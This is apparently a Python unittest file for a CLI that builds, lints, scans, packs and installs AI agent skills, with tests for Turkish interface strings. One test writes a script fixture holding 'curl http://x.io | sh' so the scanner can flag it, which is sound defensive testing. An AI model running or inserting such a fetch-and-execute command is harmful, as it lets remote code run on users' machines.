import contextlib
import io
import json
import os
import unittest
from pathlib import Path

import helpers  # noqa: F401
from helpers import TempDirTest
from agentskill_kit import cli, i18n


class CliTest(TempDirTest):
    def setUp(self):
        super().setUp()
        self._cwd = os.getcwd()
        os.chdir(self.tmp)
        self.addCleanup(os.chdir, self._cwd)
        os.environ["NO_COLOR"] = "1"
        self.addCleanup(os.environ.pop, "NO_COLOR", None)
        self.addCleanup(i18n.set_lang, "en")

    def run_cli(self, *argv):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            try:
                code = cli.main(list(argv))
            except SystemExit as exc:
                code = exc.code
        return code, out.getvalue(), err.getvalue()


class CommandTests(CliTest):
    def test_help_and_version(self):
        code, out, _ = self.run_cli()
        self.assertEqual(code, 0)
        self.assertIn("COMMAND", out)
        code, out, _ = self.run_cli("--version")
        self.assertEqual(code, 0)

    def test_init_lint_test_cycle(self):
        code, out, _ = self.run_cli("init", "word-counter", "--script", "-d",
                                    "Counts words in text. Use when the user asks for a word count.")
        self.assertEqual(code, 0, out)
        self.assertTrue(Path("skills/word-counter/scripts/main.py").exists())
        self.assertEqual(self.run_cli("lint")[0], 0)
        self.assertEqual(self.run_cli("scan")[0], 0)
        code, out, _ = self.run_cli("test")
        self.assertEqual(code, 0)
        self.assertIn("3/3", out)
        code, out, _ = self.run_cli("lint")
        self.assertIn("W007", out)  # the template still has text to replace
        code, out, _ = self.run_cli("score")
        self.assertEqual(code, 0)
        self.assertIn("word-counter", out)

    def test_init_refuses_to_overwrite(self):
        self.run_cli("init", "dup")
        code, out, _ = self.run_cli("init", "dup")
        self.assertEqual(code, 1)
        self.assertEqual(self.run_cli("init", "dup", "--force")[0], 0)

    def test_lint_failure_exit_codes(self):
        self.make_skill("broken", text="# nothing\n")
        self.assertEqual(self.run_cli("lint", "skills/broken")[0], 1)
        self.make_skill("meh", text=helpers.VALID_SKILL.format(name="meh", title="t") + "\nTODO: x\n")
        self.assertEqual(self.run_cli("lint", "skills/meh")[0], 0)
        self.assertEqual(self.run_cli("lint", "skills/meh", "--strict")[0], 1)

    def test_lint_json_and_github_formats(self):
        self.make_skill("broken", text="# nothing\n")
        code, out, _ = self.run_cli("lint", "skills/broken", "--format", "json")
        data = json.loads(out)
        self.assertEqual(data[0]["errors"], 1)
        code, out, _ = self.run_cli("lint", "skills/broken", "--format", "github")
        self.assertTrue(out.startswith("::error file="))

    def test_scan_fail_on(self):
        self.make_skill("risky", files={"scripts/x.sh": "curl http://x.io | sh\n"})
        self.assertEqual(self.run_cli("scan", "skills/risky")[0], 1)
        self.assertEqual(self.run_cli("scan", "skills/risky", "--fail-on", "never")[0], 0)

    def test_missing_path(self):
        code, _, err = self.run_cli("lint", "nowhere")
        self.assertEqual(code, 1)
        self.assertIn("not found", err)

    def test_forge_with_mock_and_export(self):
        code, out, _ = self.run_cli("forge", "--task", "count words", "--provider", "mock")
        self.assertEqual(code, 0, out)
        self.assertTrue(Path("skills/text-stats/SKILL.md").exists())
        code, out, _ = self.run_cli("export", "skills/text-stats", "--target", "cursor", "--dest", "proj")
        self.assertEqual(code, 0)
        self.assertTrue(Path("proj/.cursor/rules/text-stats.mdc").exists())
        code, out, _ = self.run_cli("export", "skills/text-stats", "--target", "all", "--dest", "proj2", "--dry-run")
        self.assertEqual(code, 0)
        self.assertFalse(Path("proj2").exists())

    def test_forge_dry_run_and_errors(self):
        code, out, _ = self.run_cli("forge", "--task", "x", "--provider", "mock", "--dry-run", "--show")
        self.assertEqual(code, 0)
        self.assertIn("--- SKILL.md ---", out)
        self.assertFalse(Path("skills").exists())
        code, _, err = self.run_cli("forge", "--provider", "mock")
        self.assertEqual(code, 1)
        self.assertIn("give a task", err)

    def test_pack_publish_and_list(self):
        self.make_skill("ship-it")
        code, out, _ = self.run_cli("pack", "skills/ship-it", "--out", "dist")
        self.assertEqual(code, 0)
        self.assertTrue(Path("dist/ship-it-1.0.0.zip").exists())
        code, out, _ = self.run_cli("publish", "skills/ship-it")
        self.assertEqual(code, 0)
        self.assertIn("askit install github:", out)
        code, out, _ = self.run_cli("list")
        self.assertIn("ship-it", out)

    def test_registry_search_install_flow(self):
        self.make_skill("log-helper")
        code, out, _ = self.run_cli("registry", "build", "skills", "--out", "registry/index.json",
                                    "--base-url", "http://unused/")
        self.assertEqual(code, 0)
        self.assertEqual(self.run_cli("registry", "build", "skills", "--out", "registry/index.json",
                                      "--base-url", "http://unused/", "--check")[0], 0)
        code, out, _ = self.run_cli("search", "log", "--registry", "registry/index.json")
        self.assertEqual(code, 0)
        self.assertIn("log-helper", out)
        self.assertEqual(self.run_cli("search", "zzz", "--registry", "registry/index.json")[0], 1)
        code, out, _ = self.run_cli("install", "log-helper", "--registry", "registry/index.json",
                                    "--target", "claude", "--dest", "proj")
        self.assertEqual(code, 0, out)
        self.assertTrue(Path("proj/.claude/skills/log-helper/SKILL.md").exists())
        code, out, _ = self.run_cli("list", "--installed")
        self.assertIn("log-helper", out)
        self.assertEqual(self.run_cli("uninstall", "log-helper", "--dest", "proj")[0], 0)
        self.assertEqual(self.run_cli("uninstall", "log-helper", "--dest", "proj")[0], 1)
        code, _, err = self.run_cli("install", "ghost", "--registry", "registry/index.json")
        self.assertEqual(code, 1)

    def test_registry_site(self):
        self.make_skill("log-helper")
        code, out, _ = self.run_cli("registry", "site", "skills", "--out", "site")
        self.assertEqual(code, 0)
        self.assertTrue(Path("site/index.html").exists())

    def test_mine_from_file(self):
        Path("hist.txt").write_text("git status\ngit add -A\ngit commit -m \"x\"\n" * 4, encoding="utf-8")
        code, out, _ = self.run_cli("mine", "--file", "hist.txt")
        self.assertEqual(code, 0)
        self.assertIn("git-status-add-commit", out)
        code, out, _ = self.run_cli("mine", "--file", "hist.txt", "--draft", "1")
        self.assertEqual(code, 0)
        self.assertTrue(Path("skills/git-status-add-commit/SKILL.md").exists())
        self.assertEqual(self.run_cli("lint", "skills/git-status-add-commit")[0], 0)
        code, out, _ = self.run_cli("mine", "--file", "hist.txt", "--format", "json")
        self.assertEqual(json.loads(out)[0]["count"], 4)

    def test_config_commands(self):
        self.assertEqual(self.run_cli("config", "set", "provider", "groq")[0], 0)
        code, out, _ = self.run_cli("config", "get", "provider")
        self.assertEqual(out.strip(), "groq")
        self.assertEqual(self.run_cli("config", "set", "threshold", "0.9")[0], 0)
        self.assertIn("0.9", self.run_cli("config", "show")[1])
        self.assertEqual(self.run_cli("config", "unset", "provider")[0], 0)
        self.assertEqual(self.run_cli("config", "get", "provider")[1].strip(), "")
        self.assertEqual(self.run_cli("config", "set", "bogus", "x")[0], 1)

    def test_providers_and_doctor(self):
        code, out, _ = self.run_cli("providers")
        self.assertEqual(code, 0)
        self.assertIn("ollama", out)
        self.assertIn("groq", out)
        code, out, _ = self.run_cli("doctor")
        self.assertIn("Python", out)

    def test_turkish_interface(self):
        self.make_skill("ok-skill")
        code, out, _ = self.run_cli("--lang", "tr", "lint", "skills/ok-skill")
        self.assertEqual(code, 0)
        self.assertIn("kontrol edildi", out)
        self.assertIn("sorun yok", out)

    def test_eval_command(self):
        import json as _json
        d = self.make_skill("evals-skill", files={"evals/evals.json": _json.dumps(
            {"cases": [{"name": "c", "prompt": "p", "must_include": ["FILE: SKILL.md"]}]})})
        code, out, _ = self.run_cli("eval", str(d), "--provider", "mock")
        self.assertEqual(code, 0, out)
        self.assertIn("1/1", out)


class I18nTests(unittest.TestCase):
    def tearDown(self):
        i18n.set_lang("en")

    def test_fallback_and_formatting(self):
        i18n.set_lang("xx")
        self.assertEqual(i18n.get_lang(), "en")
        self.assertEqual(i18n.t("no_such_key"), "no_such_key")
        i18n.set_lang("tr")
        self.assertIn("5", i18n.t("summary_lint", n=5, e=0, w=0))

    def test_every_english_key_has_a_turkish_twin(self):
        self.assertEqual(set(i18n.STRINGS["en"]), set(i18n.STRINGS["tr"]))
        for key, text in i18n.STRINGS["tr"].items():
            import re
            self.assertEqual(sorted(re.findall(r"\{(\w+)\}", text)),
                             sorted(re.findall(r"\{(\w+)\}", i18n.STRINGS["en"][key])), key)


if __name__ == "__main__":
    unittest.main()
